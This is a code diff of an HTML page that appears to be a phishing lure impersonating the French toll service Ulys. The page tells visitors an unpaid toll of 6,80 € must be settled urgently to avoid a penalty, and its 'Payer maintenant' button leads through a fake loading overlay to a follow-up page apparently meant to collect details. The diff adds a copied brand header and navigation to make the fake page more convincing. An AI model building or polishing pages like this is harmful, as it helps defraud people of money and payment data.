@@ -8,36 +8,54 @@
 </head>
 <body>
 
-  <!-- CONTENU CONTEXTE -->
+  <!-- BINDEAU HAUT BLANC -->
+  <div class="top-nav">
+    <a href="#"><span>👤</span> Mon espace</a>
+    <a href="#" class="btn-primary">Devenir client</a>
+    <div class="lang">FR ▼</div>
+  </div>
+
+  <!-- NAVBAR PRINCIPALE BLANCHE -->
+  <div class="site-nav">
+    <nav class="navbar">
+      <div class="navbar-left">
+        <a href="index.html" class="logo-container">
+          <img src="assets/images/ulys-logo.png" alt="Ulys" class="logo"/>
+        </a>
+        <div class="header-toggle">
+          <button class="toggle active">Particulier</button>
+          <button class="toggle">Professionnel</button>
+        </div>
+      </div>
+      <ul class="nav-links">
+        <li><a href="#">Télépéage</a></li>
+        <li><a href="#">Recharge électrique</a></li>
+        <li><a href="#">Parking</a></li>
+        <li><a href="#">Aide</a></li>
+      </ul>
+    </nav>
+  </div>
+
+  <!-- CONTEXTE AVANT INFO -->
   <main class="context-container">
     <p class="context-header">Merci de régler votre passage&nbsp;!</p>
-
     <div class="card context-card">
-      <!-- Logo Ulys centré -->
       <img src="assets/images/ulys-logo.png" alt="Ulys" class="context-logo"/>
-
-      <!-- Titre et message -->
       <h2 class="context-title">Paiement refusé – 6,80 € à régler</h2>
       <p>Bonjour,</p>
       <p>Nous avons constaté que votre dernier passage au péage n’a pas été réglé. Le montant dû est de 6,80 €.</p>
       <p>Il est important de régulariser cette situation dans les plus brefs délais afin d’éviter la facturation de la somme forfaitaire.</p>
       <p>Ce solde peut être réglé facilement en ligne en cliquant sur le bouton ci-dessous. Une fois le paiement effectué, aucune autre démarche ne sera nécessaire.</p>
-
-      <!-- Bouton Payer maintenant -->
       <button id="btn-pay" class="btn btn-danger">Payer maintenant</button>
     </div>
   </main>
 
-  <!-- SCRIPT DE MINI-CHARGEMENT -->
   <script>
     document.getElementById('btn-pay').addEventListener('click', function(){
-      // Overlay de chargement
       const overlay = document.createElement('div');
       overlay.className = 'loader-overlay';
       overlay.innerHTML = '<div class="loader"></div>';
       document.body.appendChild(overlay);
-
-      // Après 1.5s on redirige vers information.html
       setTimeout(()=> window.location.href = 'information.html', 1500);
     });
   </script>
